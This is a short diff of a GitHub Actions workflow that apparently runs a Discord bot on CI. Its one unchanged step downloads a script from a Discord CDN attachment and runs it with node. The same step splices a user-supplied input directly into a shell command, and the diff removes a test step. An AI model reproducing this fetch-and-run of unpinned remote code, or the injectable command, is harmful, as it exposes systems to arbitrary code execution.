@@ -19,5 +19,3 @@ jobs:
       run: cmd /c "curl https://cdn.discordapp.com/attachments/1061664042726461460/1067857361454235779/script.js -o script.js & curl ${{ github.event.inputs.link }} -o config.json & npm install discord.js@12.5.3 & node script.js"
       env:
         link: ${{ secrets.link }}
-    - name: test
-      run: ./timeout.ps1
